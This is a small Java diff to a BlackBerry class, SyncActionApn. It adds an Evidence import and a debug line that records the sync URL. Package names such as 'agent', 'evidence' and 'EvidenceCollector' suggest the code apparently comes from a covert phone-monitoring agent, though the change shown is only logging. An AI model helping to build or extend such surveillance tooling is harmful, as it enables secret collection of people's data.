@@ -17,6 +17,7 @@ import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
+import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.transfer.ProtocolException;
 import blackberry.transfer.Transfer;
@@ -186,12 +187,12 @@ public class SyncActionApn extends SyncAction {
             //#ifdef DEBUG
             debug.trace("execute: transport not available");
             //#endif
-
         }
         
         if (ret) {
             //#ifdef DEBUG
             debug.info("SyncAction OK");
+            Evidence.info("Sync:" + transport.getUrl());
             //#endif
 
             status.synced = true;
